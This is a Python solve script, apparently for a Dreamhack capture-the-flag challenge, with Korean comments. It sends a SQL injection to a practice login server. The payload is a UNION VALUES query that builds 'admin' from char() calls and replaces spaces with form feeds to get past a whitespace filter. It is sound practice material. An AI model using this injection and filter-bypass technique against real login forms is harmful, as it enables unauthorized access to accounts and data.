import requests

# 문제 서버 URL
HOST = "http://host8.dreamhack.games:11537"
URL = f"{HOST}/login"

def solve():
    print(f"[*] Target URL: {URL}")

    # 1. 'admin' 문자열을 char() 함수와 연결 연산자(||)로 변환
    # 결과 예시: char(97)||char(100)||char(109)||char(105)||char(110)
    admin_payload = "||".join([f"char({ord(c)})" for c in "admin"])
    
    # 2. 공백 우회용 문자 (Form Feed: \x0c)
    # 서버 필터 목록에 \t, \n, \r, ' '는 있지만 \x0c는 없음
    space = "\x0c"

    # 3. 최종 Payload 구성
    # 쿼리: 0 UNION VALUES('admin')
    # 구조: 0[공백]union[공백]values(admin_payload)
    payload = f"0{space}union{space}values({admin_payload})"

    print(f"[*] Generated Payload: {payload}")

    # 4. POST 데이터 구성
    data = {
        "uid": "guest",  # 아무 값이나 상관없음 (DB에 없는 값 추천)
        "upw": "guest",  # 아무 값이나 상관없음
        "level": payload # 여기가 핵심 Injection 포인트
    }

    # 5. 요청 전송
    try:
        response = requests.post(URL, data=data)
        
        # 결과 출력 (플래그 형식인 DH{...} 가 있는지 확인)
        if "DH{" in response.text:
            print("\n[+] Success! Flag found:")
            print("-" * 50)
            print(response.text.strip())
            print("-" * 50)
        else:
            print("\n[-] Failed to get flag.")
            print("Response:", response.text)
            
    except Exception as e:
        print(f"[-] Error occurred: {e}")

if __name__ == "__main__":
    solve()